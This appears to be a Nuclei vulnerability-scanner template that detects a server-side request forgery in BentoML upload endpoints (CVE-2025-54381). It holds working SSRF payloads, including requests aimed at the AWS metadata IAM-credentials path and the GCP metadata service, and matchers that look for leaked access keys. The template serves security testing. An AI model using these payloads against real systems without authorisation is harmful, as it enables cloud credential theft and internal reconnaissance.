id: cve-2025-54381

info:
  name: BentoML < 1.4.19 - Server-Side Request Forgery (SSRF)
  author: Eslam Abu Bakr @eabubakr21
  severity: critical
  description: |
    A critical Server-Side Request Forgery (SSRF) vulnerability exists in BentoML versions
    1.4.0 to 1.4.19. The vulnerability is due to improper URL validation in the file upload
    feature, which allows an unauthenticated attacker to send a crafted POST request.
    This can be exploited to access internal services, cloud metadata endpoints (AWS, GCP),
    and perform internal network reconnaissance.
  reference:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-54381
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:L
    cvss-score: 9.9
    cve-id: CVE-2025-54381
    cwe-id: CWE-918
    cpe: cpe:2.3:a:bentoml:bentoml:*:*:*:*:*:*:*:*
  tags: ssrf,cve,cve2025,bentoml,oast

requests:
  - method: POST
    path:
      - "{{BaseURL}}/upload"
      - "{{BaseURL}}/api/upload"
      - "{{BaseURL}}/models/upload"

    headers:
      Content-Type: application/json

    # Payloads to test for SSRF.
    # 1. The Interact.sh URL is the most reliable method for detection (OAST).
    # 2. The AWS metadata endpoint is a classic in-band check.
    # 3. The GCP metadata endpoint is another common target.
    payloads:
      url:
        - "http://{{interactsh-url}}"
        - "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        - "http://metadata.google.internal/computeMetadata/v1/instance"

    # The 'attack' type 'batteringram' sends one payload per request.
    attack: batteringram

    # The body of the request, injecting the payload into the 'url' parameter.
    body: '{"url": "{{url}}"}'

    # Matchers to confirm the vulnerability.
    # We use multiple matchers. Nuclei will report a match if ANY of these are successful.
    matchers:
      # Matcher 1: OAST Detection (Primary & Most Reliable)
      # This checks if the server made a DNS/HTTP request to our unique Interact.sh URL.
      - type: word
        part: interactsh_protocol
        words:
          - "dns"
          - "http"

      # Matcher 2: In-band AWS Metadata Detection
      # This checks if the response body contains content from the AWS metadata endpoint.
      - type: word
        part: body
        words:
          - '"Code"'
          - '"LastUpdated"'
          - '"TypeName"'
          - '"AccessKeyId"'
        condition: and

      # Matcher 3: In-band GCP Metadata Detection
      # This checks if the response body contains content from the GCP metadata endpoint.
      - type: word
        part: body
        words:
          - "instance/"
          - "project/"
          - "zone/"
        condition: and

    # Stop processing payloads as soon as one matcher is successful for efficiency.
    stop-at-first-match: true
